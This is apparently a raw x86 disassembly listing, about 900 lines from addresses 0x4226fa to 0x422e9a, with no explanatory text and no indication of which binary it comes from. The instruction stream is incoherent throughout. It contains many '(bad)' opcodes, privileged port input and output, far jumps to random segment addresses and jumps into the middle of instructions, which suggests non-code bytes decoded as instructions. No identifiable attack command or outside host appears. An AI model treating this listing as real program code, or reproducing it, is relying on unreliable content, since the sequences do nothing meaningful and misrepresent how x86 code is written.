  4226fa:	xchg   BYTE PTR [edi+0x4c34af39],dh
  422700:	lock rcr al,0x21
  422704:	inc    edi
  422705:	pop    esp
  422706:	cmp    BYTE PTR ds:0x9707762d,0x7c
  42270d:	push   esp
  42270e:	mov    al,BYTE PTR [ecx+eiz*8-0x80]
  422712:	test   esi,ebx
  422714:	adc    DWORD PTR [ecx],esp
  422716:	mov    eax,ds:0xbc154da9
  42271b:	jmp    0x422733
  42271d:	mov    al,ds:0xca537e02
  422722:	mov    bh,al
  422724:	adc    al,0xf
  422726:	nop
  422727:	mov    edi,0x571fbae7
  42272c:	out    0x6c,al
  42272e:	js     0x4226b2
  422730:	lock std 
  422732:	je     0x4226ee
  422734:	inc    ebx
  422735:	jns    0x4227aa
  422737:	dec    ebx
  422738:	loop   0x42271b
  42273a:	pop    ds
  42273b:	adc    BYTE PTR [edx+edi*4+0x75],al
  42273f:	(bad)  [edx+esi*1+0x7c744ebb]
  422746:	mov    ebx,0xdde41951
  42274b:	jmp    0xd170d4e9
  422750:	adc    DWORD PTR [ebx-0x2b468d7],esi
  422756:	mov    DWORD PTR [ebx+edx*2+0x5f38ea8],eax
  42275d:	jle    0x4227d4
  42275f:	rcr    DWORD PTR cs:0x219b8ff3,cl
  422766:	shl    BYTE PTR [ebx-0x21925ec6],cl
  42276c:	sbb    dl,BYTE PTR [edx+0x6dfbbbf0]
  422772:	shr    bh,cl
  422774:	es loope 0x42277e
  422777:	cwde   
  422778:	mov    ecx,0x757b15cd
  42277d:	pop    ebx
  42277e:	div    BYTE PTR [edx]
  422780:	sti    
  422781:	rcl    bh,0xaf
  422784:	les    esp,FWORD PTR [ebp-0x5c0dc8ee]
  42278a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42278b:	js     0x4227fc
  42278d:	(bad)  
  42278e:	xchg   ebp,eax
  42278f:	ja     0x42278f
  422791:	les    ebx,FWORD PTR [ebx]
  422793:	out    0xcc,eax
  422795:	push   esp
  422796:	stos   BYTE PTR es:[edi],al
  422797:	cmp    eax,0x492bcf9c
  42279c:	stos   BYTE PTR es:[edi],al
  42279d:	mov    edi,0xdf819291
  4227a2:	mov    eax,ds:0x6bf
	...
  4227af:	add    BYTE PTR [eax],al
  4227b1:	addr16 jne 0x422780
  4227b4:	inc    eax
  4227b5:	fdivp  st(1),st
  4227b7:	out    dx,eax
  4227b8:	ja     0x422794
  4227ba:	or     ebx,esi
  4227bc:	pop    edi
  4227bd:	cld    
  4227be:	aad    0x3e
  4227c0:	sbb    edx,DWORD PTR [ebp-0x53fffe60]
  4227c6:	add    eax,DWORD PTR [eax]
  4227c8:	add    ch,bh
  4227ca:	mov    edx,0x9955d63e
  4227cf:	inc    esi
  4227d0:	mov    BYTE PTR [ebx+esi*2],bl
  4227d3:	inc    edx
  4227d4:	(bad)  
  4227d5:	(bad)  
  4227d6:	jmp    0x4227c6
  4227d8:	and    ah,dh
  4227da:	jmp    0x42275f
  4227dc:	jg     0x422802
  4227de:	and    eax,esi
  4227e0:	jecxz  0x42279b
  4227e2:	stos   DWORD PTR es:[edi],eax
  4227e3:	and    ebp,eax
  4227e5:	inc    edi
  4227e6:	out    dx,al
  4227e7:	sar    dh,1
  4227e9:	jecxz  0x422855
  4227eb:	js     0x4227e8
  4227ed:	test   BYTE PTR [eax+0x25],dh
  4227f0:	into   
  4227f1:	(bad)  
  4227f2:	scas   eax,DWORD PTR es:[edi]
  4227f3:	jle    0x4227d6
  4227f5:	nop
  4227f6:	pop    esi
  4227f7:	push   edi
  4227f8:	cmp    ah,ch
  4227fa:	xchg   ebp,eax
  4227fb:	jnp    0x4227bc
  4227fd:	pop    ecx
  4227fe:	inc    ebx
  4227ff:	lds    eax,FWORD PTR [edx+0x1cea5d78]
  422805:	mov    al,ds:0x959df6df
  42280a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280b:	aas    
  42280c:	lds    edi,FWORD PTR [ecx+0x1af59abb]
  422812:	ds pop esp
  422814:	xchg   ebx,eax
  422815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422816:	fdivr  DWORD PTR [edi]
  422818:	push   esi
  422819:	jbe    0x4227dd
  42281b:	das    
  42281c:	mov    WORD PTR [esi+0x1c6bb496],gs
  422822:	(bad)  
  422823:	mov    edx,0xa81208df
  422828:	shr    BYTE PTR [ecx-0xb2c9656],cl
  42282e:	cmp    eax,0x79c0f2bf
  422833:	lods   al,BYTE PTR ds:[esi]
  422834:	cmp    cl,BYTE PTR [ecx]
  422836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422837:	jae    0x4228b6
  422839:	cmp    DWORD PTR [edx],esi
  42283b:	or     eax,0xdcc8e8e
  422840:	pushf  
  422841:	and    al,0xf2
  422843:	out    0xb6,eax
  422845:	xor    DWORD PTR [esi-0x313ab663],ebp
  42284b:	cdq    
  42284c:	out    0xec,eax
  42284e:	inc    ebp
  42284f:	adc    eax,0x91248aed
  422854:	fwait
  422855:	scas   al,BYTE PTR es:[edi]
  422856:	jnp    0x4227ff
  422858:	popf   
  422859:	or     BYTE PTR [ebx-0x6f],ah
  42285c:	sbb    ch,BYTE PTR [ebx-0x6f88a15b]
  422862:	into   
  422863:	lea    ebp,[ebx]
  422865:	add    esi,DWORD PTR [ebp+ebx*1-0xf]
  422869:	pop    edx
  42286a:	out    dx,eax
  42286b:	inc    ebx
  42286c:	cmp    DWORD PTR [edx],ecx
  42286e:	inc    eax
  42286f:	jg     0x42282d
  422871:	sub    dh,bl
  422873:	outs   dx,BYTE PTR ds:[esi]
  422874:	mov    ecx,0xb961927e
  422879:	(bad)  
  42287a:	lea    eax,[eax+0x28ac8edb]
  422880:	sbb    BYTE PTR [ecx+0x37093b0d],0x46
  422887:	sbb    DWORD PTR [ecx+esi*2-0x46],0xffffffa4
  42288c:	ret    
  42288d:	retf   0x7b4c
  422890:	add    al,0xc2
  422892:	xchg   ebp,esi
  422894:	jnp    0x422891
  422896:	je     0x4228bb
  422898:	fild   WORD PTR [ecx-0x7b0f3c1e]
  42289e:	and    ah,BYTE PTR [edi+0x61]
  4228a1:	ret    0xf432
  4228a4:	out    dx,eax
  4228a5:	out    dx,eax
  4228a6:	mov    dh,0x34
  4228a8:	lods   al,BYTE PTR ds:[esi]
  4228a9:	popf   
  4228aa:	dec    ecx
  4228ab:	loope  0x4228d7
  4228ad:	mov    es,edi
  4228af:	hlt    
  4228b0:	inc    ebp
  4228b1:	leave  
  4228b2:	test   cl,ch
  4228b4:	div    DWORD PTR [ecx+esi*1+0x16e06238]
  4228bb:	mov    cl,0x3
  4228bd:	push   esi
  4228be:	inc    ebx
  4228bf:	(bad)  
  4228c0:	iret   
  4228c1:	imul   ecx,DWORD PTR [eax+0x43],0x15090040
  4228c8:	dec    edi
  4228c9:	cmp    WORD PTR [ebp+0x78],bx
  4228cd:	xchg   ebx,eax
  4228ce:	sub    eax,0xbdc6738
  4228d3:	mov    ds:0x4f16f593,al
  4228d8:	pop    esp
  4228d9:	adc    BYTE PTR [ecx-0x3a],dl
  4228dc:	popf   
  4228dd:	leave  
  4228de:	mov    edx,0xfde3bf26
  4228e3:	push   ss
  4228e4:	leave  
  4228e5:	(bad)  
  4228e6:	fsubr  st(6),st
  4228e8:	cmc    
  4228e9:	lock cmp bl,BYTE PTR [edi-0x9a3adea]
  4228f0:	out    0xd6,eax
  4228f2:	out    0x16,al
  4228f4:	lds    edi,FWORD PTR [edi]
  4228f6:	hlt    
  4228f7:	xor    DWORD PTR [eax-0x1c],ebx
  4228fa:	mov    cs,edi
  4228fc:	jg     0x422889
  4228fe:	test   BYTE PTR [esi-0x6c27c187],dh
  422904:	clc    
  422905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422906:	idiv   BYTE PTR [ebp-0x5a]
  422909:	icebp  
  42290a:	xor    ecx,edx
  42290c:	mov    eax,DWORD PTR [edx+0x3fa1e90d]
  422912:	(bad)  
  422913:	retf   
  422914:	(bad)  
  422915:	push   ecx
  422916:	out    0x3e,eax
  422918:	mov    dh,BYTE PTR [esi+0x5cccb45f]
  42291e:	inc    eax
  42291f:	mov    edx,0xdd4268a
  422924:	cdq    
  422925:	or     esp,ebp
  422927:	push   0x36d7f832
  42292c:	inc    ebx
  42292d:	pusha  
  42292e:	mov    edx,0xd51c5152
  422933:	jns    0x4228c0
  422935:	out    0x18,al
  422937:	sbb    al,0xf6
  422939:	or     ch,BYTE PTR [eax+eax*1-0x1983d4d7]
  422940:	mov    bl,0x43
  422942:	mov    edi,0x67139334
  422947:	lock fwait
  422949:	or     BYTE PTR [edx],ah
  42294b:	in     eax,dx
  42294c:	iret   
  42294d:	jno    0x4228d4
  42294f:	iret   
  422950:	lahf   
  422951:	(bad)  
  422952:	repnz or eax,0xd5df3d67
  422958:	aam    0xfb
  42295a:	pop    ds
  42295b:	mov    dl,0x93
  42295d:	leave  
  42295e:	jo     0x4228f5
  422960:	cmp    eax,0xcdc78b64
  422965:	mov    ebp,0xbd23ad2e
  42296a:	or     edx,DWORD PTR [ebx]
  42296c:	xor    ecx,ebp
  42296e:	adc    edi,ebx
  422970:	popa   
  422971:	pop    esi
  422972:	out    0x61,eax
  422974:	imul   edx,DWORD PTR [esi-0x22777cca],0xefe39d31
  42297e:	aad    0xa9
  422980:	lods   al,BYTE PTR ds:[esi]
  422981:	push   ds
  422982:	stos   BYTE PTR es:[edi],al
  422983:	test   al,0x2
  422985:	retf   0x557
  422988:	cmp    DWORD PTR [ebp-0x16],edx
  42298b:	xor    ah,cl
  42298d:	les    edx,FWORD PTR [ebx-0x2f131529]
  422993:	in     al,0xa4
  422995:	stos   DWORD PTR es:[edi],eax
  422996:	or     BYTE PTR [edx+0x733522aa],cl
  42299c:	fild   QWORD PTR [edx]
  42299e:	jg     0x422968
  4229a0:	cs stc 
  4229a2:	push   edi
  4229a3:	test   eax,0xfe533c18
  4229a8:	adc    BYTE PTR [ecx-0xa],bl
  4229ab:	(bad)  [eax-0x5e]
  4229ae:	das    
  4229af:	sub    eax,0xd3b29ff7
  4229b4:	mov    edx,0x6840db89
  4229b9:	pop    es
  4229ba:	stos   BYTE PTR es:[edi],al
  4229bb:	mov    dl,bh
  4229bd:	mov    ch,BYTE PTR [edx+ebx*1+0x5]
  4229c1:	retf   
  4229c2:	push   ebx
  4229c3:	fsubr  st(3),st
  4229c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229c6:	push   0x52e51173
  4229cb:	fstp   DWORD PTR [edi-0x1c]
  4229ce:	rol    esp,cl
  4229d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229d1:	lods   al,BYTE PTR ds:[esi]
  4229d2:	jne    0x422a4d
  4229d4:	into   
  4229d5:	sub    al,0xdb
  4229d7:	dec    esi
  4229d8:	shl    BYTE PTR [ebx-0x73f5fd7d],0x5
  4229df:	add    ah,cl
  4229e1:	jb     0x4229ea
  4229e3:	add    bh,bl
  4229e5:	cmovo  ebp,DWORD PTR [eax+0x27]
  4229e9:	mov    cl,0xdb
  4229eb:	call   0x86b3b6cd
  4229f0:	int    0x7e
  4229f2:	call   0x9455:0xfa07dd35
  4229f9:	xor    ecx,DWORD PTR [ecx-0x10f17a65]
  4229ff:	jp     0x4229c3
  422a01:	lods   eax,DWORD PTR ds:[esi]
  422a02:	mov    bh,0x4c
  422a04:	pushf  
  422a05:	fcomp  QWORD PTR [edx]
  422a07:	retf   
  422a08:	lds    ecx,FWORD PTR [edi+esi*4]
  422a0b:	mov    al,ds:0xbcb922cc
  422a10:	lods   al,BYTE PTR ds:[esi]
  422a11:	xlat   BYTE PTR ds:[ebx]
  422a12:	push   es
  422a13:	pop    ecx
  422a14:	arpl   WORD PTR [ebx+0x2b],di
  422a17:	sahf   
  422a18:	into   
  422a19:	mov    esp,0x3d26f5d4
  422a1e:	dec    ebx
  422a1f:	stos   BYTE PTR es:[edi],al
  422a20:	fs inc eax
  422a22:	iret   
  422a23:	inc    esi
  422a24:	into   
  422a25:	repz inc ecx
  422a27:	pop    ds
  422a28:	pop    esi
  422a29:	mov    DWORD PTR [edx-0x4ae89d82],eax
  422a2f:	cmp    eax,0x30cac249
  422a34:	or     al,0x65
  422a36:	fldcw  WORD PTR [edi+0x7ce7c57f]
  422a3c:	test   al,0x8d
  422a3e:	and    eax,0x95a82171
  422a43:	retf   
  422a44:	jno    0x422aa9
  422a46:	daa    
  422a47:	xor    al,0x7e
  422a49:	mov    ebp,0x2d49885b
  422a4e:	pop    esp
  422a4f:	out    dx,eax
  422a50:	push   esi
  422a51:	push   ebx
  422a52:	sbb    BYTE PTR [edx-0x7],bh
  422a55:	dec    esp
  422a56:	(bad)  
  422a57:	or     ecx,ebx
  422a59:	sub    bl,BYTE PTR [ebx+0x10ac0b2f]
  422a5f:	out    dx,eax
  422a60:	ins    BYTE PTR es:[edi],dx
  422a61:	sbb    dl,BYTE PTR [edi]
  422a63:	sub    al,0x59
  422a65:	pmuludq mm1,mm4
  422a68:	cmc    
  422a69:	loope  0x422a00
  422a6b:	aad    0xc6
  422a6d:	adc    edi,edx
  422a6f:	cmp    eax,ebx
  422a71:	push   0x62919b3c
  422a76:	xchg   ebx,eax
  422a77:	repz dec eax
  422a79:	xchg   ebx,eax
  422a7a:	shr    BYTE PTR [ecx-0x47],0x53
  422a7e:	and    ecx,esi
  422a80:	fwait
  422a81:	xor    ecx,esp
  422a83:	(bad)  
  422a84:	and    al,0x9a
  422a86:	(bad)  
  422a87:	cmc    
  422a88:	pop    ebp
  422a89:	lods   al,BYTE PTR ds:[esi]
  422a8a:	xchg   ebx,eax
  422a8b:	rcl    BYTE PTR [ecx+0x75],0xb
  422a8f:	jge    0x422a98
  422a91:	aaa    
  422a92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a93:	sub    BYTE PTR [ebx+0x60],0xb3
  422a97:	das    
  422a98:	sahf   
  422a99:	fild   QWORD PTR [ecx-0x75]
  422a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a9d:	mov    dl,0x96
  422a9f:	das    
  422aa0:	clc    
  422aa1:	test   al,0x31
  422aa3:	mov    esp,0xd418e55d
  422aa8:	and    eax,0xcbf9237a
  422aad:	cs stos BYTE PTR es:[edi],al
  422aaf:	xor    ebp,DWORD PTR [ebx-0x54]
  422ab2:	dec    edi
  422ab3:	pop    edx
  422ab4:	call   0x6121:0x9f3025ea
  422abb:	mov    ebx,DWORD PTR [edi]
  422abd:	out    0xbf,eax
  422abf:	push   esp
  422ac0:	inc    eax
  422ac1:	mov    BYTE PTR [eax+0x4d],ch
  422ac4:	and    al,0x51
  422ac6:	lods   eax,DWORD PTR ds:[esi]
  422ac7:	in     al,dx
  422ac8:	push   ss
  422ac9:	icebp  
  422aca:	mov    esi,0x8ed041c0
  422acf:	dec    esi
  422ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ad2:	not    BYTE PTR [ecx+eax*2+0x25]
  422ad6:	push   edx
  422ad8:	xchg   esp,eax
  422ad9:	jle    0x422a98
  422adb:	mov    dl,0x44
  422add:	xor    eax,0x8d53be0b
  422ae2:	inc    eax
  422ae3:	jmp    0x76797d19
  422ae8:	pop    edi
  422ae9:	stos   BYTE PTR es:[edi],al
  422aea:	and    eax,ebx
  422aec:	outs   dx,BYTE PTR ds:[esi]
  422aed:	xchg   ah,dh
  422aef:	imul   ecx,edx,0xffffffd8
  422af2:	inc    ebx
  422af3:	outs   dx,BYTE PTR ds:[esi]
  422af4:	dec    ecx
  422af5:	push   esp
  422af6:	and    BYTE PTR [edi],bl
  422af8:	sbb    cl,BYTE PTR [esi+0x5edd3372]
  422afe:	and    eax,0xfecbac0b
  422b03:	xor    ebp,esi
  422b05:	aaa    
  422b06:	push   ss
  422b07:	push   cs
  422b08:	xor    eax,0x95f841a
  422b0d:	dec    ebx
  422b0e:	cmp    DWORD PTR [ebp+0x7c],ecx
  422b11:	stos   BYTE PTR es:[edi],al
  422b12:	(bad)  
  422b14:	push   edx
  422b15:	and    ebp,DWORD PTR [ebp-0x24]
  422b18:	inc    edx
  422b19:	ss pop ss
  422b1b:	mov    dh,0x5a
  422b1d:	ror    ch,cl
  422b1f:	xchg   esp,eax
  422b20:	mov    eax,ds:0xba619aae
  422b25:	mov    ds:0xfcb68f2d,al
  422b2a:	fcom   QWORD PTR ds:0x338c2c1f
  422b30:	cmp    bl,dl
  422b32:	push   eax
  422b33:	pop    edx
  422b34:	dec    ebp
  422b35:	out    dx,al
  422b36:	dec    edi
  422b37:	in     al,0xe5
  422b39:	push   edi
  422b3a:	dec    esp
  422b3b:	out    dx,eax
  422b3c:	inc    esi
  422b3d:	dec    ebp
  422b3e:	lahf   
  422b3f:	sbb    eax,DWORD PTR [eax+0x5e]
  422b42:	pop    ebx
  422b43:	adc    al,0x5d
  422b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b46:	scas   eax,DWORD PTR es:[edi]
  422b47:	sti    
  422b48:	nop
  422b49:	jp     0x422b57
  422b4b:	and    edi,DWORD PTR [ecx+0x16]
  422b4e:	jne    0x422af0
  422b50:	inc    esi
  422b51:	(bad)  
  422b52:	imul   ebx,DWORD PTR [edx],0xffffffab
  422b55:	pop    edx
  422b56:	cmp    BYTE PTR [ebx-0x21d655a4],0xe4
  422b5d:	ins    DWORD PTR es:[edi],dx
  422b5e:	loope  0x422b50
  422b60:	sahf   
  422b61:	jmp    0x65e21e6b
  422b66:	add    ebx,DWORD PTR [edx+0x7d674a6e]
  422b6c:	xchg   ebx,eax
  422b6d:	add    ebx,ebp
  422b6f:	xchg   edi,eax
  422b70:	int    0x99
  422b72:	mov    ch,0xdc
  422b74:	rol    DWORD PTR [eax],0x0
	...
  422b7f:	add    BYTE PTR [eax],al
  422b81:	mov    al,ds:0xbc09b42c
  422b86:	cdq    
  422b87:	mov    ebp,0x52812ad
  422b8c:	xor    bh,BYTE PTR [ecx+0x417966e7]
  422b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b93:	add    DWORD PTR [eax],eax
  422b95:	lods   al,BYTE PTR ds:[esi]
  422b96:	add    eax,DWORD PTR [eax]
  422b98:	add    BYTE PTR [edi],bh
  422b9a:	dec    ecx
  422b9b:	or     DWORD PTR [eax+edx*1-0x36dde496],ebx
  422ba2:	pusha  
  422ba3:	pop    ebx
  422ba4:	stos   BYTE PTR es:[edi],al
  422ba5:	arpl   WORD PTR [edx-0x29],cx
  422ba8:	shl    edi,1
  422baa:	jp     0x422bf9
  422bac:	mov    al,ds:0x20031cc6
  422bb1:	mov    eax,ds:0xf37b9a4b
  422bb6:	jl     0x422b75
  422bb8:	stc    
  422bb9:	push   ecx
  422bba:	pop    ds
  422bbb:	mov    dh,0x89
  422bbd:	in     al,0xe3
  422bbf:	out    0x74,al
  422bc1:	push   edi
  422bc2:	pop    ds
  422bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bc4:	fild   QWORD PTR [edi]
  422bc6:	inc    ebx
  422bc7:	push   0x83953e0b
  422bcc:	sbb    al,0x92
  422bce:	mov    ebp,0x35d509e8
  422bd3:	lahf   
  422bd4:	enter  0xc228,0xa7
  422bd8:	pop    ss
  422bd9:	aas    
  422bda:	int3   
  422bdb:	sahf   
  422bdc:	rcl    DWORD PTR [edx-0x6327fe28],0xe0
  422be3:	les    eax,FWORD PTR [edx+ebx*1-0x5a2bf00d]
  422bea:	ja     0x422c20
  422bec:	mov    ecx,0x42639e8b
  422bf1:	shl    BYTE PTR [edx-0x4],1
  422bf4:	cmp    DWORD PTR [edi+edi*2],ebx
  422bf7:	jns    0x422b8c
  422bf9:	jnp    0x422c27
  422bfb:	add    BYTE PTR [esi],dh
  422bfd:	and    DWORD PTR [edi+0xa34a802],ebp
  422c03:	je     0x422bba
  422c05:	into   
  422c06:	add    edx,ecx
  422c08:	xchg   esi,eax
  422c09:	sbb    BYTE PTR [eax-0x29],0xde
  422c0d:	test   al,0x6c
  422c0f:	xrelease mov DWORD PTR [eax+0x41],esp
  422c13:	adc    ch,ch
  422c15:	or     eax,0xb2585915
  422c1a:	push   0x6db50a34
  422c1f:	clc    
  422c20:	sbb    BYTE PTR [ecx+0x7c],al
  422c23:	inc    eax
  422c24:	jne    0x422bbc
  422c26:	aaa    
  422c27:	jl     0x422bd4
  422c29:	xlat   BYTE PTR ds:[ebx]
  422c2a:	gs jmp 0x40b9:0x8ac05ea4
  422c32:	jmp    0xf81e:0xa9d391b1
  422c39:	jmp    0x3182:0xed142bb3
  422c40:	sbb    BYTE PTR [ecx+ebx*2+0x2af12f5c],al
  422c47:	inc    ebp
  422c48:	mov    al,gs:0xc495a7bc
  422c4e:	mov    eax,0xad59081d
  422c53:	jmp    0xd45b50f1
  422c58:	inc    eax
  422c59:	dec    edx
  422c5a:	sbb    BYTE PTR [ecx],0x21
  422c5d:	add    BYTE PTR [ecx+0x15447e19],0xa6
  422c64:	addr16 and eax,0xf8efc87e
  422c6a:	in     al,dx
  422c6b:	ins    BYTE PTR es:[edi],dx
  422c6c:	int    0xd4
  422c6e:	cld    
  422c6f:	adc    al,0xa8
  422c71:	xchg   BYTE PTR [ecx+0x75],bh
  422c74:	jmp    0x2a22:0x1686f045
  422c7b:	mov    bh,0xd1
  422c7d:	mov    BYTE PTR [ecx-0x67603f9f],al
  422c83:	xchg   edi,eax
  422c84:	xchg   ebx,eax
  422c85:	pushf  
  422c86:	jns    0x422c20
  422c88:	pop    edi
  422c89:	sub    BYTE PTR [esi],ch
  422c8b:	mov    eax,0x68f87cff
  422c90:	popf   
  422c91:	stc    
  422c92:	push   esp
  422c93:	ret    0xb147
  422c96:	test   eax,0xc49684d3
  422c9b:	mov    ecx,0x7c30f33b
  422ca0:	push   ecx
  422ca1:	add    edi,ecx
  422ca3:	into   
  422ca4:	cmp    al,0x42
  422ca6:	sub    DWORD PTR ds:0x4bc4491f,eax
  422cac:	iret   
  422cad:	aaa    
  422cae:	cmp    BYTE PTR [esi],0xa9
  422cb1:	or     dl,BYTE PTR [ecx-0x2c4a66e7]
  422cb7:	inc    ecx
  422cb8:	aas    
  422cb9:	ret    0x978f
  422cbc:	je     0x422c8c
  422cbe:	rol    DWORD PTR [ecx],0x6f
  422cc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cc2:	push   ds
  422cc3:	jmp    0x9215:0x1ba72f9c
  422cca:	test   al,0x1b
  422ccc:	mov    al,0x54
  422cce:	push   ebp
  422ccf:	push   cs
  422cd0:	cmp    bh,BYTE PTR [edx]
  422cd2:	pop    ebx
  422cd3:	mov    ds:0x922248c8,al
  422cd8:	or     ebp,DWORD PTR [edx+0x70]
  422cdb:	and    esp,DWORD PTR [ebx-0x1e]
  422cde:	cld    
  422cdf:	or     al,0x0
  422ce1:	or     al,0xe0
  422ce3:	mov    ah,0xcb
  422ce5:	or     eax,0x624b257f
  422cea:	pop    eax
  422ceb:	or     eax,0xf5670707
  422cf0:	in     eax,dx
  422cf1:	sti    
  422cf2:	jo     0x422ca6
  422cf4:	enter  0x9185,0xa2
  422cf8:	mov    ecx,0x2209298f
  422cfd:	jno    0x422c87
  422cff:	jbe    0x422cf8
  422d01:	daa    
  422d02:	fwait
  422d03:	pop    edi
  422d04:	push   0x3e
  422d06:	xchg   edx,eax
  422d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d08:	jge    0x422d7f
  422d0a:	fild   WORD PTR [edi+0x64]
  422d0d:	bswap  eax
  422d0f:	enter  0xcb57,0x5b
  422d13:	sbb    DWORD PTR [ecx],eax
  422d15:	std    
  422d16:	scas   eax,DWORD PTR es:[edi]
  422d17:	xchg   edx,eax
  422d18:	jecxz  0x422d4c
  422d1a:	or     ch,al
  422d1c:	iret   
  422d1d:	test   al,0xfa
  422d1f:	loop   0x422d1f
  422d21:	repnz (bad) 
  422d23:	cmp    BYTE PTR [edx-0x4b58d689],ah
  422d29:	mov    ebp,0xd14ebd5f
  422d2e:	cli    
  422d2f:	dec    ebp
  422d30:	bndldx (bad),[edi+edi*2+0x1d08b693]
  422d38:	cmp    bh,bh
  422d3a:	dec    esp
  422d3b:	mov    dl,0x41
  422d3d:	rcr    ch,cl
  422d3f:	jnp    0x422d34
  422d41:	and    eax,0x4772da50
  422d46:	push   edi
  422d47:	inc    esi
  422d48:	pop    ss
  422d49:	fcmovnb st,st(4)
  422d4b:	loopne 0x422d94
  422d4d:	inc    eax
  422d4e:	scas   eax,DWORD PTR es:[edi]
  422d4f:	jp     0x422dcd
  422d51:	punpckldq mm0,DWORD PTR [eax]
  422d54:	enter  0xc62d,0x2d
  422d58:	jl     0x422db2
  422d5a:	xor    DWORD PTR [ebp+0x37],ecx
  422d5d:	dec    ebx
  422d5e:	icebp  
  422d5f:	or     BYTE PTR [ecx+eax*4],bh
  422d62:	sti    
  422d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d64:	jno    0x422cf3
  422d66:	std    
  422d67:	ret    
  422d68:	mov    edx,eax
  422d6a:	dec    esi
  422d6b:	xor    edx,ebx
  422d6d:	lahf   
  422d6e:	mov    eax,0x83a591ef
  422d73:	xchg   esi,eax
  422d74:	mov    ebx,DWORD PTR [esi+0x1cd3c65a]
  422d7a:	xchg   edi,eax
  422d7b:	and    cl,0x8f
  422d7e:	aad    0x57
  422d80:	xor    DWORD PTR [edx],edi
  422d82:	ret    
  422d83:	sbb    BYTE PTR [edx-0x1fada8a6],bh
  422d89:	adc    BYTE PTR [esi+0x352b6fc],dh
  422d8f:	mov    ?,WORD PTR [ebx-0xa]
  422d92:	mov    eax,0xbbc78b88
  422d97:	push   edi
  422d98:	sbb    ecx,DWORD PTR [ebx*8-0x67e81475]
  422d9f:	and    edx,DWORD PTR [eax]
  422da1:	call   0x3c5d:0x9a59b41a
  422da8:	push   eax
  422da9:	push   0x3b
  422dab:	test   al,0x99
  422dad:	add    DWORD PTR [esi],ebp
  422daf:	sbb    dh,BYTE PTR [edi-0x78]
  422db2:	jo     0x422dcb
  422db4:	loop   0x422dbe
  422db6:	dec    esp
  422db7:	imul   eax,DWORD PTR [esi-0x74ad9464],0x67
  422dbe:	loop   0x422d73
  422dc0:	and    eax,0xd2d7b11e
  422dc5:	mov    dl,cl
  422dc7:	test   DWORD PTR [ecx],edx
  422dc9:	rcr    BYTE PTR [ecx],0x93
  422dcc:	jne    0x422d79
  422dce:	xor    DWORD PTR [esi-0x62],ebp
  422dd1:	add    eax,0x12b62a4c
  422dd6:	or     edi,esi
  422dd8:	repnz pop ebp
  422dda:	or     edi,DWORD PTR [ebx]
  422ddc:	sub    eax,0xee834469
  422de1:	mov    al,ds:0x8e8e2ab6
  422de6:	stos   DWORD PTR es:[edi],eax
  422de7:	mov    ds:0x504b71ee,al
  422dec:	lahf   
  422ded:	idiv   BYTE PTR [esp+eiz*4]
  422df0:	ficomp DWORD PTR [edi+0x18]
  422df3:	(bad)  
  422df4:	fdivrp st(5),st
  422df6:	jo     0x422e02
  422df8:	hlt    
  422df9:	stc    
  422dfa:	mov    ?,WORD PTR [esi-0x74]
  422dfd:	inc    edi
  422dfe:	sbb    BYTE PTR [ebx+0x11],0x30
  422e02:	push   0xc780866e
  422e07:	push   0x6a
  422e09:	push   ss
  422e0a:	scas   al,BYTE PTR es:[edi]
  422e0b:	cmp    BYTE PTR [edx+0x42],dh
  422e0e:	cmp    DWORD PTR [ecx],esi
  422e10:	jne    0x422db5
  422e12:	add    eax,DWORD PTR cs:[ecx]
  422e15:	mov    ds:0xe6069ada,al
  422e1a:	cwde   
  422e1b:	scas   al,BYTE PTR es:[edi]
  422e1c:	ja     0x422dcf
  422e1e:	fcmovb st,st(5)
  422e20:	cmp    ebp,DWORD PTR [ebx+0x77]
  422e23:	push   ebx
  422e24:	sub    al,0xb7
  422e26:	xchg   ecx,eax
  422e27:	xchg   edx,eax
  422e28:	pop    ebx
  422e29:	scas   al,BYTE PTR es:[edi]
  422e2a:	data16 sbb al,0x59
  422e2d:	xchg   DWORD PTR [ecx+0x18452ccf],edx
  422e33:	les    edx,FWORD PTR [ecx-0x3226e81b]
  422e39:	and    esi,DWORD PTR [esi+0x67]
  422e3c:	mov    cl,0x40
  422e3e:	sub    DWORD PTR [ebp+0x553d00af],ebx
  422e44:	xor    esi,eax
  422e46:	cmp    al,0xa6
  422e48:	push   0xffffffd8
  422e4a:	outs   dx,BYTE PTR ds:[esi]
  422e4b:	sub    BYTE PTR [ecx+0x13fa38b4],al
  422e51:	cs popa 
  422e53:	icebp  
  422e54:	push   ebp
  422e55:	rol    DWORD PTR [esi],0x94
  422e58:	add    edi,ebx
  422e5a:	test   DWORD PTR [eax+0x70122a6e],eax
  422e60:	stos   DWORD PTR es:[edi],eax
  422e61:	repz test edi,ebx
  422e64:	arpl   dx,bx
  422e66:	scas   al,BYTE PTR es:[edi]
  422e67:	and    ebp,DWORD PTR [edx]
  422e69:	adc    cl,BYTE PTR [edx+0x2e6d9276]
  422e6f:	mov    ds:0x20e9d22f,eax
  422e74:	pop    ds
  422e75:	xor    DWORD PTR [edx],eax
  422e77:	cld    
  422e78:	lahf   
  422e79:	mov    BYTE PTR [ecx+0x430bf6ba],bl
  422e7f:	sbb    DWORD PTR [esi],edx
  422e81:	xor    edx,DWORD PTR [esi-0x4e6a21d0]
  422e87:	dec    esp
  422e88:	ret    0x1f6d
  422e8b:	icebp  
  422e8c:	sub    al,BYTE PTR [esi+0x20]
  422e8f:	mov    bh,0x24
  422e91:	inc    edi
  422e92:	call   0x74924e81
  422e97:	cmp    al,0x2c
  422e99:	iret   
  422e9a:	loop   0x422ee6
